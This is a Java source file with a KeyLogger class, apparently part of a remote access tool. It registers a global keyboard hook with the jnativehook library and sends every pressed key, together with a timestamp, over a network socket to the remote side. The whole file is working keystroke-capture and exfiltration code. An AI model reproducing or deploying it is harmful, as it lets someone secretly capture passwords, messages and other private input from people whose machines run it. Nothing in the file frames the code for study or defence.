package Function;

import Server.SendRecv;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.net.Socket;
import java.sql.Timestamp;

public class KeyLogger implements NativeKeyListener, SendRecv {
    private static boolean isStart = false;
    private Socket connect;

    public void stopKeyLogger() {
        if (isStart) {
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException e) {
                throw new RuntimeException(e);
            }
            isStart = false;
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
        try {
            SendRecv.sendMess(connect, NativeKeyEvent.getKeyText(nativeEvent.getKeyCode()));
            Timestamp time = new Timestamp(new java.util.Date().getTime());
//        Change time stamp to date and time format
            String timeString = time.toString();
            SendRecv.sendMess(connect, timeString);
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }

    public KeyLogger(Socket connect) {
        this.connect = connect;
    }

    public void startKeyLog() {
        if (isStart) {
            return;
        }

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
        }
        GlobalScreen.addNativeKeyListener(new KeyLogger(connect));
    }
}